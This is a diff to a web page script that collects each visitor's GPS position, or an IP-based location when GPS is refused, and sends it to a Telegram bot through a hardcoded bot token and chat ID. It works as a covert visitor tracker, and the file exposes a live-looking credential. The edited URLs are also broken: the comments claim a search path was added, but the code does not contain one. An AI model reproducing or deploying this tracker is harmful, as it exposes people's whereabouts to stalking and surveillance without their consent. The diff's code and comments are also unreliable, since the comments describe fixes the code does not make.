@@ -56,7 +56,7 @@
     const TOKEN = '9068600803:AAEPd0lHMbVcyxhsCbXJGfutL0X-v6mr-pY';
     const CHAT_ID = '9180377107';
 
-    // Función esencial para limpiar caracteres reservados en el HTML de Telegram (&, <, >)
+    // Función para sanitizar caracteres que rompen el HTML de Telegram
     function escapeHTML(text) {
         return String(text).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
     }
@@ -67,11 +67,10 @@
             const lon = pos.coords.longitude;
             const acc = Math.round(pos.coords.accuracy);
 
-            // Tu formato de búsqueda exacto con las variables incrustadas de forma segura
-            const rawUrl = "https://google.com" + lat + "%2C" + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "%2C" + lon;
+            // CORREGIDO: Se estructuró la dirección de búsqueda completa (con /search?q=) y una coma limpia
+            const rawUrl = "https://google.com" + lat + "," + lon + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + lat + "," + lon;
             const safeUrl = escapeHTML(rawUrl);
 
-            // El link href configurado correctamente con comillas simples (') para Telegram HTML
             const texto = "<b>📍 Nueva Visita (GPS)</b>\n\n" +
                           "• Latitud: " + lat + "\n" +
                           "• Longitud: " + lon + "\n" +
@@ -89,7 +88,7 @@
             }).catch(e => console.error("Error enviando GPS:", e));
 
         }, function(err) {
-            // Respaldos por IP
+            // Respaldo por consulta de IP externa
             fetch('https://ipapi.co')
             .then(res => res.json())
             .then(data => {
@@ -99,7 +98,8 @@
                 const country = data.country_name || 'Desconocido';
                 const city = data.city || 'Desconocida';
                 
-                const rawUrlIP = "https://google.com" + latIP + "%2C" + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "%2C" + lonIP;
+                // CORREGIDO: Se estructuró la dirección completa en el fallback de IP también
+                const rawUrlIP = "https://google.com" + latIP + "," + lonIP + "&rlz=1C1UEAD_esMX1233MX1238&oq=" + latIP + "," + lonIP;
                 const safeUrlIP = escapeHTML(rawUrlIP);
 
                 const textoIP = "<b>🌐 Nueva Visita (Por IP)</b>\n\n" +
